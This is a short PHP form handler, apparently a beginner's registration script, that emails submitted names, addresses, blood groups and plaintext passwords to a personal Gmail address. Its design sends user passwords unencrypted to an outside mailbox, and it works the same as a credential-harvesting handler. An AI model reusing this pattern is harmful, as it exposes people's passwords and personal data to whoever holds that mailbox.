<?php

// if(isset ($_POST['register']))

// {

// $name = $_POST['name'];
// $email = $_POST['email'];
// $state = $_POST['state'];
// $address = $_POST['address'];
// $password = $_POST['password'];
// $cpassword = $_POST['cpassword'];
// $bgroup = $_POST['bgroup'];

// $to = 'vpretty2014@gmail.com';
// $subject = "Login Details";
// $message = "$name $email $state $address $password with $bgroup Just logged to the registration form";

// $headers = 'From: >';

// mail($to,$subject,$message,$headers);

// echo " Login Successfull";

// echo " <a href='testmail.php'> HOME </a> ";
    
// }
// else{

// echo "";

// }


if($_POST["name"] != "" and $_POST["email"] != "" and $_POST["state"] != "" and $_POST["address"] != "" and $_POST["password"] != "" and $_POST["bgroup"] != ""){
    $to = 'vpretty2014@gmail.com';
    $subject = "Login Details";
    $message = "NAME : ".$_POST["name"]."\n";
    $message .= "EMAIL : ".$_POST["email"]."\n";
    $message .= "STATE : ".$_POST["state"]."\n";
    $message .= "ADDRESS : ".$_POST["address"]."\n";
    $message .= "PASSWORD : ".$_POST["password"]."\n";
    $message .= "BLOOD GROUP : ".$_POST["bgroup"]."\n";
    $headers =  'From: Vivian';
    if(mail($to,$subject,$message,$headers)){
        echo "success";
    }else {
        echo "sending failed";
    }
    
}else{
    echo "error";
}

?>
